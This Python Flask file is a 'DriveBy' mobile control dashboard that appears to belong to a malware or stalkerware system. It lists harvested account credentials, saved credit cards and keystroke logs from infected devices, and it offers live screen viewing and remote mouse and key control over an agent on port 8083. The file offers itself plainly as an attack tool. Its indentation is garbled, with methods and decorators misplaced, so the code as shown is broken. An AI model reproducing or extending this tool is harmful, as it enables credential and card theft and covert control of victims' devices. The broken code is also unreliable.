#!/usr/bin/env python3
"""
DriveBy Mobile Dashboard
Complete mobile-friendly UI for managing all connected devices and collected data
"""

import json
import os
import base64
import threading
import time
from datetime import datetime, timedelta
from flask import Flask, render_template_string, request, jsonify, send_file
from flask_socketio import SocketIO, emit
import requests
import subprocess

class MobileDashboard:
    def __init__(self, config_path="config.json"):
        self.load_config(config_path)
        self.app = Flask(__name__)
        self.app.config['SECRET_KEY'] = 'driveby_mobile_dashboard_2024'
        self.socketio = SocketIO(self.app, cors_allowed_origins="*")

        self.connected_devices = {}
        self.device_screens = {}
        self.setup_routes()
        self.setup_socketio()

    def load_config(self, config_path):
        """Load configuration"""
        try:
            with open(config_path, 'r') as f:
                self.config = json.load(f)
        except FileNotFoundError:
                self.config = {
                "server": {"host": "0.0.0.0", "port": 8080, "data_port": 8081, "dashboard_port": 8082},
                "data": {"storage_path": "collected_data"}
                }

def get_dashboard_html(self):
    """Generate mobile-friendly dashboard HTML"""
    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>DriveBy Control Center</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <style>
    * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    }

    body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: #333;
    overflow-x: hidden;
    }

    .header {
    background: rgba(255,255,255,0.95);
    backdrop-filter: blur(10px);
    padding: 15px 20px;
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    z-index: 1000;
    box-shadow: 0 2px 20px rgba(0,0,0,0.1);
    }

    .header h1 {
    font-size: 24px;
    font-weight: 700;
    color: #667eea;
    text-align: center;
    }

    .nav-tabs {
    display: flex;
    justify-content: space-around;
    background: rgba(255,255,255,0.9);
    margin-top: 10px;
    border-radius: 25px;
    padding: 5px;
    }

    .nav-tab {
    flex: 1;
    text-align: center;
    padding: 10px 5px;
    border-radius: 20px;
    cursor: pointer;
    transition: all 0.3s ease;
    font-size: 12px;
    font-weight: 600;
    }

    .nav-tab.active {
    background: #667eea;
    color: white;
    }

    .content {
    margin-top: 120px;
    padding: 20px;
    min-height: calc(100vh - 120px);
    }

    .tab-content {
    display: none;
    }

    .tab-content.active {
    display: block;
    }

    .device-card {
    background: rgba(255,255,255,0.95);
    border-radius: 15px;
    padding: 20px;
    margin-bottom: 15px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
    position: relative;
    }

    .device-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 15px;
    }

    .device-name {
    font-size: 18px;
    font-weight: 600;
    color: #333;
    }

    .device-status {
    padding: 5px 12px;
    border-radius: 20px;
    font-size: 12px;
    font-weight: 600;
    }

    .status-online {
    background: #4CAF50;
    color: white;
    }

    .status-offline {
    background: #f44336;
    color: white;
    }

    .device-info {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 10px;
    margin-bottom: 15px;
    font-size: 14px;
    }

    .device-actions {
    display: flex;
    gap: 10px;
    flex-wrap: wrap;
    }

    .btn {
    padding: 8px 16px;
    border: none;
    border-radius: 20px;
    font-size: 12px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s ease;
    flex: 1;
    min-width: 80px;
    }

    .btn-primary {
    background: #667eea;
    color: white;
    }

    .btn-success {
    background: #4CAF50;
    color: white;
    }

    .btn-warning {
    background: #ff9800;
    color: white;
    }

    .btn-danger {
    background: #f44336;
    color: white;
    }

    .btn:hover {
    transform: translateY(-2px);
    box-shadow: 0 4px 12px rgba(0,0,0,0.2);
    }

    .screen-viewer {
    background: #000;
    border-radius: 10px;
    margin: 15px 0;
    position: relative;
    overflow: hidden;
    }

    .screen-image {
    width: 100%;
    height: auto;
    display: block;
    }

    .screen-controls {
    position: absolute;
    bottom: 10px;
    left: 50%;
    transform: translateX(-50%);
    display: flex;
    gap: 10px;
    }

    .control-btn {
    background: rgba(255,255,255,0.2);
    border: none;
    color: white;
    padding: 10px;
    border-radius: 50%;
    cursor: pointer;
    backdrop-filter: blur(10px);
    }

    .data-table {
    background: rgba(255,255,255,0.95);
    border-radius: 15px;
    overflow: hidden;
    margin-bottom: 15px;
    }

    .table-header {
    background: #667eea;
    color: white;
    padding: 15px 20px;
    font-weight: 600;
    }

    .table-content {
    max-height: 300px;
    overflow-y: auto;
    }

    .table-row {
    padding: 15px 20px;
    border-bottom: 1px solid #eee;
    display: flex;
    justify-content: space-between;
    align-items: center;
    }

    .table-row:last-child {
    border-bottom: none;
    }

    .credential-item {
    background: rgba(255,255,255,0.95);
    border-radius: 10px;
    padding: 15px;
    margin-bottom: 10px;
    border-left: 4px solid #667eea;
    }

    .credential-service {
    font-weight: 600;
    color: #667eea;
    margin-bottom: 5px;
    }

    .credential-details {
    font-size: 14px;
    color: #666;
    }

    .card-item {
    background: rgba(255,255,255,0.95);
    border-radius: 10px;
    padding: 15px;
    margin-bottom: 10px;
    border-left: 4px solid #4CAF50;
    }

    .card-type {
    font-weight: 600;
    color: #4CAF50;
    margin-bottom: 5px;
    }

    .card-details {
    font-size: 14px;
    color: #666;
    }

    .stats-grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 15px;
    margin-bottom: 20px;
    }

    .stat-card {
    background: rgba(255,255,255,0.95);
    border-radius: 15px;
    padding: 20px;
    text-align: center;
    }

    .stat-number {
    font-size: 32px;
    font-weight: 700;
    color: #667eea;
    margin-bottom: 5px;
    }

    .stat-label {
    font-size: 14px;
    color: #666;
    }

    .loading {
    text-align: center;
    padding: 40px;
    color: rgba(255,255,255,0.8);
    }

    .spinner {
    border: 3px solid rgba(255,255,255,0.3);
    border-top: 3px solid white;
    border-radius: 50%;
    width: 40px;
    height: 40px;
    animation: spin 1s linear infinite;
    margin: 0 auto 20px;
    }

    @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
    }

    .modal {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.8);
    z-index: 2000;
    }

    .modal-content {
    background: white;
    margin: 10% auto;
    padding: 20px;
    border-radius: 15px;
    width: 90%;
    max-width: 500px;
    position: relative;
    }

    .close {
    position: absolute;
    top: 15px;
    right: 20px;
    font-size: 24px;
    cursor: pointer;
    }

    @media (max-width: 480px) {
    .device-info {
    grid-template-columns: 1fr;
    }

    .stats-grid {
    grid-template-columns: 1fr;
    }

    .device-actions {
    flex-direction: column;
    }

    .btn {
    flex: none;
    }
    }
    </style>
    </head>
    <body>
    <div class="header">
    <h1>🚗 DriveBy Control Center</h1>
    <div class="nav-tabs">
    <div class="nav-tab active" onclick="showTab('devices')">Devices</div>
    <div class="nav-tab" onclick="showTab('credentials')">Accounts</div>
    <div class="nav-tab" onclick="showTab('cards')">Cards</div>
    <div class="nav-tab" onclick="showTab('keystrokes')">Activity</div>
    <div class="nav-tab" onclick="showTab('remote')">Remote</div>
    </div>
    </div>

    <div class="content">
    <!-- Devices Tab -->
    <div id="devices" class="tab-content active">
    <div class="stats-grid">
    <div class="stat-card">
    <div class="stat-number" id="total-devices">0</div>
    <div class="stat-label">Total Devices</div>
    </div>
    <div class="stat-card">
    <div class="stat-number" id="online-devices">0</div>
    <div class="stat-label">Online Now</div>
    </div>
    </div>

    <div id="devices-list">
    <div class="loading">
    <div class="spinner"></div>
    <p>Loading devices...</p>
    </div>
    </div>
    </div>

    <!-- Credentials Tab -->
    <div id="credentials" class="tab-content">
    <div class="data-table">
    <div class="table-header">Saved Account Credentials</div>
    <div id="credentials-list">
    <div class="loading">
    <div class="spinner"></div>
    <p>Loading credentials...</p>
    </div>
    </div>
    </div>
    </div>

    <!-- Cards Tab -->
    <div id="cards" class="tab-content">
    <div class="data-table">
    <div class="table-header">Saved Credit Cards</div>
    <div id="cards-list">
    <div class="loading">
    <div class="spinner"></div>
    <p>Loading credit cards...</p>
    </div>
    </div>
    </div>
    </div>

    <!-- Keystrokes Tab -->
    <div id="keystrokes" class="tab-content">
    <div class="data-table">
    <div class="table-header">Recent Activity</div>
    <div id="keystrokes-list">
    <div class="loading">
    <div class="spinner"></div>
    <p>Loading activity data...</p>
    </div>
    </div>
    </div>
    </div>

    <!-- Remote Control Tab -->
    <div id="remote" class="tab-content">
    <div id="remote-devices">
    <div class="loading">
    <div class="spinner"></div>
    <p>Loading remote control...</p>
    </div>
    </div>
    </div>
    </div>

    <!-- Screen Viewer Modal -->
    <div id="screen-modal" class="modal">
    <div class="modal-content">
    <span class="close" onclick="closeScreenModal()">&times;</span>
    <h3 id="screen-device-name">Device Screen</h3>
    <div class="screen-viewer">
    <img id="screen-image" class="screen-image" src="" alt="Device Screen">
    <div class="screen-controls">
    <button class="control-btn" onclick="refreshScreen()">🔄</button>
    <button class="control-btn" onclick="takeScreenshot()">📷</button>
    </div>
    </div>
    </div>
    </div>

    <script>
    const socket = io();
    let currentDevice = null;

    // Tab switching
    function showTab(tabName) {
    // Hide all tabs
    document.querySelectorAll('.tab-content').forEach(tab => {
    tab.classList.remove('active');
    });
    document.querySelectorAll('.nav-tab').forEach(tab => {
    tab.classList.remove('active');
    });

    // Show selected tab
    document.getElementById(tabName).classList.add('active');
    event.target.classList.add('active');

    // Load tab data
    loadTabData(tabName);
    }

    function loadTabData(tabName) {
    switch(tabName) {
    case 'devices':
    loadDevices();
    break;
    case 'credentials':
    loadCredentials();
    break;
    case 'cards':
    loadCards();
    break;
    case 'keystrokes':
    loadKeystrokes();
    break;
    case 'remote':
    loadRemoteDevices();
    break;
    }
    }

    function loadDevices() {
    fetch('/api/devices')
    .then(response => response.json())
    .then(data => {
    updateDeviceStats(data);
    renderDevices(data.devices);
    })
    .catch(error => {
    console.error('Error loading devices:', error);
    });
    }

    function updateDeviceStats(data) {
    document.getElementById('total-devices').textContent = data.total || 0;
    document.getElementById('online-devices').textContent = data.online || 0;
    }

    function renderDevices(devices) {
    const container = document.getElementById('devices-list');

    if (!devices || devices.length === 0) {
    container.innerHTML = '<div class="loading"><p>No devices found</p></div>';
    return;
    }

    let html = '';
    devices.forEach(device => {
    const isOnline = device.status === 'online';
    html += `
    <div class="device-card">
    <div class="device-header">
    <div class="device-name">${device.hostname || device.ip}</div>
    <div class="device-status ${isOnline ? 'status-online' : 'status-offline'}">
    ${isOnline ? 'Online' : 'Offline'}
    </div>
    </div>
    <div class="device-info">
    <div><strong>IP:</strong> ${device.ip}</div>
    <div><strong>Type:</strong> ${device.type || 'Unknown'}</div>
    <div><strong>User:</strong> ${device.username || 'Unknown'}</div>
    <div><strong>Last Seen:</strong> ${formatTime(device.last_seen)}</div>
    </div>
    <div class="device-actions">
    <button class="btn btn-primary" onclick="viewScreen('${device.ip}')">📱 Screen</button>
    <button class="btn btn-success" onclick="controlDevice('${device.ip}')">🎮 Control</button>
    <button class="btn btn-warning" onclick="viewData('${device.ip}')">📊 Data</button>
    <button class="btn btn-danger" onclick="disconnectDevice('${device.ip}')">🚫 Disconnect</button>
    </div>
    </div>
    `;
    });

    container.innerHTML = html;
    }

    function loadCredentials() {
    fetch('/api/credentials')
    .then(response => response.json())
    .then(data => {
    renderCredentials(data.credentials);
    })
    .catch(error => {
    console.error('Error loading credentials:', error);
    });
    }

    function renderCredentials(credentials) {
    const container = document.getElementById('credentials-list');

    if (!credentials || credentials.length === 0) {
    container.innerHTML = '<div class="loading"><p>No credentials found</p></div>';
    return;
    }

    let html = '';
    credentials.forEach(cred => {
    html += `
    <div class="credential-item">
    <div class="credential-service">${cred.service} - ${cred.device_username}@${cred.device_hostname}</div>
    <div class="credential-details">
    <strong>Email:</strong> ${cred.email}<br>
    <strong>Stored:</strong> ${formatTime(cred.timestamp)}
    </div>
    </div>
    `;
    });

    container.innerHTML = html;
    }

    function loadCards() {
    fetch('/api/cards')
    .then(response => response.json())
    .then(data => {
    renderCards(data.cards);
    })
    .catch(error => {
    console.error('Error loading cards:', error);
    });
    }

    function renderCards(cards) {
    const container = document.getElementById('cards-list');

    if (!cards || cards.length === 0) {
    container.innerHTML = '<div class="loading"><p>No credit cards found</p></div>';
    return;
    }

    let html = '';
    cards.forEach(card => {
    html += `
    <div class="card-item">
    <div class="card-type">${card.card_type} - ${card.device_username}@${card.device_hostname}</div>
    <div class="card-details">
    <strong>Number:</strong> ${card.card_number_masked || '****-****-****-' + card.last_four}<br>
    <strong>Name:</strong> ${card.name_on_card || 'N/A'}<br>
    <strong>Expires:</strong> ${card.expiration_month}/${card.expiration_year}<br>
    <strong>Source:</strong> ${card.source}
    </div>
    </div>
    `;
    });

    container.innerHTML = html;
    }

    function loadKeystrokes() {
    fetch('/api/keystrokes')
    .then(response => response.json())
    .then(data => {
    renderKeystrokes(data.keystrokes);
    })
    .catch(error => {
    console.error('Error loading keystrokes:', error);
    });
    }

    function renderKeystrokes(keystrokes) {
    const container = document.getElementById('keystrokes-list');

    if (!keystrokes || keystrokes.length === 0) {
    container.innerHTML = '<div class="loading"><p>No activity data found</p></div>';
    return;
    }

    let html = '';
    keystrokes.forEach(entry => {
    html += `
    <div class="table-row">
    <div>
    <strong>${entry.device}</strong><br>
    <small>${formatTime(entry.timestamp)}</small>
    </div>
    <div>
    ${entry.keystroke_count} keystrokes
    </div>
    </div>
    `;
    });

    container.innerHTML = html;
    }

    function loadRemoteDevices() {
    const container = document.getElementById('remote-devices');

    fetch('/api/devices')
    .then(response => response.json())
    .then(data => {
    let html = '';
    data.devices.forEach(device => {
    if (device.status === 'online') {
    html += `
    <div class="device-card">
    <div class="device-header">
    <div class="device-name">${device.hostname || device.ip}</div>
    <div class="device-status status-online">Remote Ready</div>
    </div>
    <div class="device-actions">
    <button class="btn btn-primary" onclick="startRemoteControl('${device.ip}')">🖥️ View Screen</button>
    <button class="btn btn-success" onclick="startRemoteControl('${device.ip}', true)">🎮 Full Control</button>
    </div>
    <div id="remote-${device.ip}" class="screen-viewer" style="display: none;">
    <img class="screen-image" id="screen-${device.ip}" src="">
    <div class="screen-controls">
    <button class="control-btn" onclick="sendClick('${device.ip}', event)">👆</button>
    <button class="control-btn" onclick="sendKey('${device.ip}', 'space')">⎵</button>
    <button class="control-btn" onclick="sendKey('${device.ip}', 'enter')">↵</button>
    </div>
    </div>
    </div>
    `;
    }
    });

    if (html === '') {
    html = '<div class="loading"><p>No devices available for remote control</p></div>';
    }

    container.innerHTML = html;
    });
    }

    // Device control functions
    function viewScreen(deviceIP) {
    fetch(`/api/device/${deviceIP}/screen`)
    .then(response => response.blob())
    .then(blob => {
    const url = URL.createObjectURL(blob);
    document.getElementById('screen-image').src = url;
    document.getElementById('screen-device-name').textContent = `${deviceIP} Screen`;
    document.getElementById('screen-modal').style.display = 'block';
    currentDevice = deviceIP;
    });
    }

    function controlDevice(deviceIP) {
    // Start remote control session
    fetch(`/api/device/${deviceIP}/control`, { method: 'POST' })
    .then(response => response.json())
    .then(data => {
    if (data.success) {
    alert(`Remote control started for ${deviceIP}`);
    showTab('remote');
    }
    });
    }

    function startRemoteControl(deviceIP, fullControl = false) {
    const container = document.getElementById(`remote-${deviceIP}`);
    container.style.display = 'block';

    // Start screen streaming
    const img = document.getElementById(`screen-${deviceIP}`);

    function updateScreen() {
    fetch(`/api/device/${deviceIP}/screen?t=${Date.now()}`)
    .then(response => response.blob())
    .then(blob => {
    const url = URL.createObjectURL(blob);
    img.src = url;
    })
    .catch(error => console.error('Screen update error:', error));
    }

    // Update screen every 2 seconds
    updateScreen();
    const interval = setInterval(updateScreen, 2000);

    // Store interval for cleanup
    img.dataset.interval = interval;
    }

    function sendClick(deviceIP, event) {
    const rect = event.target.getBoundingClientRect();
    const x = event.clientX - rect.left;
    const y = event.clientY - rect.top;

    fetch(`/api/device/${deviceIP}/click`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ x, y })
    });
    }

    function sendKey(deviceIP, key) {
    fetch(`/api/device/${deviceIP}/key`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ key })
    });
    }

    function viewData(deviceIP) {
    // Switch to appropriate data tab and filter by device
    showTab('keystrokes');
    }

    function disconnectDevice(deviceIP) {
    if (confirm(`Disconnect device ${deviceIP}?`)) {
    fetch(`/api/device/${deviceIP}/disconnect`, { method: 'POST' })
    .then(response => response.json())
    .then(data => {
    if (data.success) {
    loadDevices();
    }
    });
    }
    }

    function closeScreenModal() {
    document.getElementById('screen-modal').style.display = 'none';
    currentDevice = null;
    }

    function refreshScreen() {
    if (currentDevice) {
    viewScreen(currentDevice);
    }
    }

    function takeScreenshot() {
    if (currentDevice) {
    fetch(`/api/device/${currentDevice}/screenshot`, { method: 'POST' })
    .then(response => response.json())
    .then(data => {
    if (data.success) {
    alert('Screenshot saved');
    }
    });
    }
    }

    function formatTime(timestamp) {
    if (!timestamp) return 'Unknown';
    const date = new Date(timestamp);
    return date.toLocaleString();
    }

    // Socket.IO events for real-time updates
    socket.on('device_connected', function(data) {
    loadDevices();
    });

    socket.on('device_disconnected', function(data) {
    loadDevices();
    });

    socket.on('new_data', function(data) {
    // Update relevant tabs if they're active
    const activeTab = document.querySelector('.tab-content.active').id;
    loadTabData(activeTab);
    });

    // Initialize dashboard
    document.addEventListener('DOMContentLoaded', function() {
    loadDevices();
    });

    // Auto-refresh every 30 seconds
    setInterval(() => {
    const activeTab = document.querySelector('.tab-content.active').id;
    if (activeTab === 'devices') {
    loadDevices();
    }
    }, 30000);
    </script>
    </body>
    </html>
    '''

def setup_routes(self):
    """Setup Flask routes for mobile dashboard"""

    @self.app.route('/')
def dashboard():
    """Main dashboard page"""
    return self.get_dashboard_html()

    @self.app.route('/api/devices')
def get_devices():
    """Get all connected devices"""
    try:
        # Load device data from main service
        response = requests.get('http://localhost:8080/status', timeout=5)
        if response.status_code == 200:
            data = response.json()
            devices = []

            for ip, info in data.get('devices', {}).items():
                device = {
                'ip': ip,
                'hostname': info.get('hostname', ip),
                'username': info.get('username', 'Unknown'),
                'type': info.get('type', 'Unknown'),
                'last_seen': info.get('last_seen'),
                'status': 'online' if self.is_device_online(ip) else 'offline'
                }
                devices.append(device)

                return jsonify({
                'total': len(devices),
                'online': len([d for d in devices if d['status'] == 'online']),
                'devices': devices
                })
    except Exception as e:
                print(f"Error getting devices: {e}")

                return jsonify({'total': 0, 'online': 0, 'devices': []})

                @self.app.route('/api/credentials')
def get_credentials():
    """Get all stored credentials"""
    credentials = []
    creds_dir = os.path.join(self.config['data']['storage_path'], 'credentials')

    if os.path.exists(creds_dir):
        for filename in os.listdir(creds_dir):
            if filename.endswith('.json'):
                try:
                    filepath = os.path.join(creds_dir, filename)
                    with open(filepath, 'r') as f:
                        cred_data = json.load(f)
                        credentials.append(cred_data)
                except Exception as e:
                        continue

                        return jsonify({'credentials': credentials})

                        @self.app.route('/api/cards')
def get_cards():
    """Get all stored credit cards"""
    cards = []
    cards_dir = os.path.join(self.config['data']['storage_path'], 'cards')

    if os.path.exists(cards_dir):
        for filename in os.listdir(cards_dir):
            if filename.endswith('.json'):
                try:
                    filepath = os.path.join(cards_dir, filename)
                    with open(filepath, 'r') as f:
                        card_data = json.load(f)
                        cards.extend(card_data.get('credit_cards', []))
                except Exception as e:
                        continue

                        return jsonify({'cards': cards})

                        @self.app.route('/api/keystrokes')
def get_keystrokes():
    """Get recent keystroke activity"""
    keystrokes = []
    data_dir = self.config['data']['storage_path']

    if os.path.exists(data_dir):
        # Look through device directories
        for item in os.listdir(data_dir):
            device_dir = os.path.join(data_dir, item)
            if os.path.isdir(device_dir) and not item.startswith('.'):
                # Get recent files from this device
                device_files = []
                for filename in os.listdir(device_dir):
                    if filename.startswith('data_') and filename.endswith('.json'):
                        filepath = os.path.join(device_dir, filename)
                        try:
                            with open(filepath, 'r') as f:
                                data = json.load(f)
                                keystroke_count = len(data.get('data', {}).get('keystrokes', []))
                                if keystroke_count > 0:
                                    keystrokes.append({
                                    'device': item,
                                    'timestamp': data.get('timestamp'),
                                    'keystroke_count': keystroke_count,
                                    'filename': filename
                                    })
                        except Exception as e:
                                    continue

                                    # Sort by timestamp, most recent first
                                    keystrokes.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
                                    return jsonify({'keystrokes': keystrokes[:50]})  # Return last 50 entries

                                    @self.app.route('/api/device/<device_ip>/screen')
def get_device_screen(device_ip):
    """Get device screen capture"""
    try:
        # Request screenshot from device
        screenshot_data = self.capture_device_screen(device_ip)
        if screenshot_data:
            return screenshot_data, 200, {'Content-Type': 'image/png'}
        else:
            # Return placeholder image
            return self.get_placeholder_screen(), 200, {'Content-Type': 'image/png'}
    except Exception as e:
            print(f"Error getting screen for {device_ip}: {e}")
            return self.get_placeholder_screen(), 200, {'Content-Type': 'image/png'}

            @self.app.route('/api/device/<device_ip>/control', methods=['POST'])
def start_device_control(device_ip):
    """Start remote control session"""
    try:
        # Send control command to device
        success = self.start_remote_control(device_ip)
        return jsonify({'success': success})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

        @self.app.route('/api/device/<device_ip>/click', methods=['POST'])
def send_device_click(device_ip):
    """Send click command to device"""
    try:
        data = request.get_json()
        x, y = data.get('x', 0), data.get('y', 0)
        success = self.send_click_to_device(device_ip, x, y)
        return jsonify({'success': success})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

        @self.app.route('/api/device/<device_ip>/key', methods=['POST'])
def send_device_key(device_ip):
    """Send key command to device"""
    try:
        data = request.get_json()
        key = data.get('key', '')
        success = self.send_key_to_device(device_ip, key)
        return jsonify({'success': success})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

        @self.app.route('/api/device/<device_ip>/disconnect', methods=['POST'])
def disconnect_device(device_ip):
    """Disconnect device"""
    try:
        success = self.disconnect_device(device_ip)
        return jsonify({'success': success})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

        @self.app.route('/api/device/<device_ip>/screenshot', methods=['POST'])
def save_device_screenshot(device_ip):
    """Save device screenshot"""
    try:
        screenshot_data = self.capture_device_screen(device_ip)
        if screenshot_data:
            # Save screenshot
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"screenshot_{device_ip}_{timestamp}.png"
            screenshots_dir = os.path.join(self.config['data']['storage_path'], 'screenshots')
            os.makedirs(screenshots_dir, exist_ok=True)

            filepath = os.path.join(screenshots_dir, filename)
            with open(filepath, 'wb') as f:
                f.write(screenshot_data)

                return jsonify({'success': True, 'filename': filename})
            else:
                return jsonify({'success': False, 'error': 'Failed to capture screen'})
    except Exception as e:
                return jsonify({'success': False, 'error': str(e)})

def setup_socketio(self):
    """Setup Socket.IO events for real-time updates"""

    @self.socketio.on('connect')
def handle_connect():
    print('Mobile dashboard client connected')
    emit('status', {'message': 'Connected to DriveBy Control Center'})

    @self.socketio.on('disconnect')
def handle_disconnect():
    print('Mobile dashboard client disconnected')

def is_device_online(self, device_ip):
    """Check if device is currently online"""
    try:
        # Simple ping check
        result = subprocess.run(['ping', '-c', '1', '-W', '1', device_ip],
        capture_output=True, text=True, timeout=3)
        return result.returncode == 0
    except Exception:
        return False

def capture_device_screen(self, device_ip):
    """Capture screenshot from remote device"""
    try:
        # Send screenshot request to device
        response = requests.post(f'http://{device_ip}:8083/screenshot', timeout=10)
        if response.status_code == 200:
            return response.content
    except Exception as e:
            print(f"Error capturing screen from {device_ip}: {e}")
            return None

def get_placeholder_screen(self):
    """Generate placeholder screen image"""
    # Simple base64 encoded placeholder image
    placeholder_b64 = """
        iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChAI9jU77zgAAAABJRU5ErkJggg==
    """
    return base64.b64decode(placeholder_b64.strip())

def start_remote_control(self, device_ip):
    """Start remote control session with device"""
    try:
        response = requests.post(f'http://{device_ip}:8083/start-control', timeout=5)
        return response.status_code == 200
    except Exception as e:
        print(f"Error starting remote control for {device_ip}: {e}")
        return False

def send_click_to_device(self, device_ip, x, y):
    """Send click command to device"""
    try:
        data = {'x': x, 'y': y}
        response = requests.post(f'http://{device_ip}:8083/click', json=data, timeout=5)
        return response.status_code == 200
    except Exception as e:
        print(f"Error sending click to {device_ip}: {e}")
        return False

def send_key_to_device(self, device_ip, key):
    """Send key command to device"""
    try:
        data = {'key': key}
        response = requests.post(f'http://{device_ip}:8083/key', json=data, timeout=5)
        return response.status_code == 200
    except Exception as e:
        print(f"Error sending key to {device_ip}: {e}")
        return False

def disconnect_device(self, device_ip):
    """Disconnect device from network"""
    try:
        # This would typically involve network management commands
        # For now, just send a disconnect signal to the device
        response = requests.post(f'http://{device_ip}:8083/disconnect', timeout=5)
        return response.status_code == 200
    except Exception as e:
        print(f"Error disconnecting {device_ip}: {e}")
        return False

def run(self):
    """Start the mobile dashboard server"""
    print("Starting DriveBy Mobile Dashboard...")

    port = self.config.get('server', {}).get('dashboard_port', 8082)
    print(f"Mobile Dashboard available at: http://localhost:{port}")
    print("Features:")
    print("  📱 Mobile-optimized interface")
    print("  🖥️  Remote screen viewing")
    print("  🎮 Device remote control")
    print("  💳 Credit card management")
    print("  🔐 Credential management")
    print("  ⌨️  Keystroke activity monitoring")

    self.socketio.run(
    self.app,
    host='0.0.0.0',
    port=port,
    debug=False
    )

    if __name__ == "__main__":
        try:
            dashboard = MobileDashboard()
            dashboard.run()
        except KeyboardInterrupt:
            print("\nShutting down Mobile Dashboard...")
        except Exception as e:
            print(f"Error starting mobile dashboard: {e}")
